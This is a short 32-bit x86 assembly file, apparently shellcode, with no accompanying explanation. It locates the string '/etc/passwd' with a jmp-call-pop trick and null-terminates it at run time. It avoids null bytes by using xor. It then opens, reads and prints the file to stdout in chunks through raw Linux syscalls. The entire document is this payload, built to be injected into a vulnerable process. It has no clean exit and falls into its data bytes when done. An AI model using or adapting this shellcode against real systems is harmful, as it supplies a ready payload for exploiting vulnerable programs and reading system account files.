bits 32
section .text
global _start

_start:
	
	jmp getaddr

	; open("/etc/passwd", O_RDONLY)
	open:

		xor ecx, ecx
		pop ebx
		mov byte [ebx + 0xb], cl

		push 0x5
		pop eax ; SYS_open

		int 0x80

		mov esi, eax



		; read(filefd, buf, 0x40)
		xor edx, edx
		mov dl, 0x40
		sub sp, dx
		mov ecx, esp
		readchunk:
		mov ebx, esi
		push 0x3
		pop eax ; SYS_read

		int 0x80

		test eax, eax
		jz filename

		; write(stdout, buf, len(buf))

		mov bl, 1
		mov dl, al

		push 0x4
		pop eax ; SYS_write

		int 0x80

		jmp readchunk
		
	getaddr:
		call open
	filename:
		db "/etc/passwdx"